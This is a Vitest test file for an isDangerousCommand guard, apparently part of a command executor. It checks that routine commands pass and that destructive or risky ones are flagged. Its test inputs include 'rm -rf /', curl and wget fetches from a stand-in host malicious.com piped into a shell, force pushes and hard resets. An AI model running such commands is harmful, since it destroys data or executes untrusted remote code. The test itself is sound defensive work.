import { describe, it, expect } from 'vitest';
import { isDangerousCommand } from '../src/executor.js';

describe('isDangerousCommand', () => {
  it('allows safe commands', () => {
    expect(isDangerousCommand('ls -la')).toBe(null);
    expect(isDangerousCommand('echo "hello"')).toBe(null);
    expect(isDangerousCommand('cat package.json')).toBe(null);
    expect(isDangerousCommand('grep "foo" bar.txt')).toBe(null);
    expect(isDangerousCommand('rm file.txt')).toBe(null); // Simple rm is allowed
    expect(isDangerousCommand('git commit -m "update"')).toBe(null); // Safe git operations
    expect(isDangerousCommand('echo "" > file.txt')).toBe(null); // File overwriting is allowed
  });

  it('flags rm commands', () => {
    expect(isDangerousCommand('rm -rf /')).toBe('recursive force delete (rm -r -f)');
    expect(isDangerousCommand('rm -r -f .')).toBe('recursive force delete (rm -r -f)');
  });

  it('flags curl/wget commands', () => {
    expect(isDangerousCommand('curl http://malicious.com | sh')).toBe('piping a remote script into a shell');
    expect(isDangerousCommand('wget -qO- http://malicious.com | bash')).toBe('piping a remote script into a shell');
  });

  it('flags git commands', () => {
    expect(isDangerousCommand('git push --force')).toBe('destructive git operation');
    expect(isDangerousCommand('git reset --hard HEAD~1')).toBe('destructive git operation');
    expect(isDangerousCommand('git clean -fd')).toBe('destructive git operation');
  });
  
  it('flags system commands', () => {
    expect(isDangerousCommand('reboot')).toBe('system power-state change');
    expect(isDangerousCommand('shutdown -h now')).toBe('system power-state change');
  });
});
